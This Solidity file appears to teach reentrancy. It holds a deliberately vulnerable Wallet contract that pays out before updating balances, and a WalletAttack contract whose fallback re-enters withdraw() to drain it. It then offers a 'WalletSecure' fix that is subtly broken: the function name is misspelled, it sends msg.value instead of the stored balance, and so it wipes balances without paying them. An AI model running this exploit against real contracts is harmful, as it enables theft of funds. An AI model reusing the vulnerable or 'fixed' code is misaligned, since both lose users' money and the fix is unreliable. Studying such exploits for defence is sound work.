// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
. When a Contract is Open to Reentrancy Attack These senario happens
. Wallet call WalletAttack to receive Eth
. WalletAttack call Wallet to withdraw again
*/

contract Wallet{
    address public owner;
    mapping(address => uint) public accounts;

    constructor(){
        owner = msg.sender;
    }
    function deposite() external payable {
        accounts[msg.sender] += msg.value;
    }
    function withdraw() external {
        uint bal = accounts[msg.sender];
        require(bal > 0, "No balance to withdraw.");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Withdraw Failed");
 
        accounts[msg.sender] = 0;
    }
}

contract WalletAttack{
    Wallet wallet;

    constructor(address _add){
        wallet = Wallet(_add);
    }

    fallback() external payable{
        if(address(wallet).balance > 0){
            wallet.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        wallet.deposite{value: 1 ether}();
        wallet.withdraw();
    }

    function contractBalance() external view returns(uint){
        return address(this).balance;
    }
}
/*
. Prevent-1 :: Change StateVariable before sending Eth
. Prevent-2 :: Use Openzepplin Re-entrancy Guard contract
*/

contract WalletSecure{
    address public owner;
    mapping(address => uint) public accounts;

    constructor(){
        owner = msg.sender;
    }
    function deposite() external payable {
        accounts[msg.sender] += msg.value;
    }
    function withdrwa() external payable {
        uint bal = accounts[msg.sender];
        require(bal > 0, "No balance to withdraw.");

        accounts[msg.sender] = 0;

        (bool sent, ) = payable(msg.sender).call{value: msg.value}("");
        require(sent, "Withdraw Failed");
    }
}